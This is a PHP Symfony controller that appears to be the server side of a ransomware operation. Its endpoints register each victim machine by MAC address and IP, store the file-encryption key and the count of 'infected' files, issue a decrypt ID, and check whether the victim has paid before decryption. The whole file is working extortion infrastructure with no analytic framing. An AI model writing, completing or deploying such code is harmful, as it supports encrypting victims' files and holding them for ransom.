<?php

namespace App\Controller\Api;

use App\Controller\BaseController;
use App\Entity\Log;
use App\Entity\Transaction;
use App\Entity\User;
use App\Repository\LogRepository;
use App\Repository\TransactionRepository;
use App\Repository\UserRepository;
use App\Service\API\UserService;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Uid\Uuid;

class UserController extends BaseController
{
    public function __construct(
        private UserPasswordHasherInterface $passwordHasher,
        private UserRepository $userRepository,
        private LogRepository $logRepository,
        private UserService $userService,
        private TransactionRepository $transactionRepository
    ) {}

    /**
     * @Route("/register", methods={"POST"})
     */
    public function register(Request $request): Response
    {
        try {
            $data = json_decode($request->getContent(), true);
            $macAdress = $data['macAddress'];

            $encryptionKey = $data['encryptionKey'];

            $user = $this->userRepository->findOneBy(['macAddress' => $macAdress]) ?? new User();
            $user->setIp($data['ip']);

            $uuid = Uuid::v4();

            $user->setMacAddress($macAdress)
                ->setPassword($this->passwordHasher->hashPassword(
                    $user,
                    $uuid
                ))
                ->setRoles(['ROLE_USER'])
                ->setEncryptionKey($encryptionKey)
                ->setDecryptId($uuid);

            $this->userRepository->save($user, true);

            $log = (new Log)
                ->setIp($data['ip']);

            if(array_key_exists('encryptedFiles', $data)) $log->setNumberInfectedFile($data['encryptedFiles']);

            $this->logRepository->save($log, true);

            return $this->json($user->getDecryptId());
        } catch(\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }

    /**
     * @Route("/signin", methods={"POST"})
     */
    public function signin(Request $request): Response
    {
        try {
            $data = json_decode($request->getContent(), true);

            if(!array_key_exists('decryptId', $data)) {
                throw $this->createAccessDeniedException('Invalid decrypt Id');
            }

            $user = $this->userRepository->findOneBy(['decryptId' => $data['decryptId']]);

            if(!$user) {
                throw $this->createAccessDeniedException('Invalid decrypt Id');
            }

            if($data['email']) {
                $user->setEmail($data['email']);
                $this->userRepository->save($user, true);
            }

            $isTransactionAlreadyPaid = $this->transactionRepository->findLastOneByUserAndStatus($user, [
                Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS,
                Transaction::TRANSACTION_USER_FILE_DECRYPTED
            ]);

            if($isTransactionAlreadyPaid) {
                return $this->json([
                    'error' => true,
                    'message' => "Tu as déjà payé, regarde tes mails !"
                ]);
            }

            return $this->json([
                'success' => true,
                'token' => $user->getDecryptId()
            ]);
        } catch(\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }

    /**
     * @Route("/api/is-infected/{macAddress}", methods={"GET"})
     */
    public function isInfected(string $macAddress) {
        try {
            $isInfected = $this->userService->isInfected($macAddress);
            return  $this->json(['is_infected' => $isInfected]);
        } catch (\Throwable $th) {
            return $this->failure($th->getMessage());
        }
    }
}
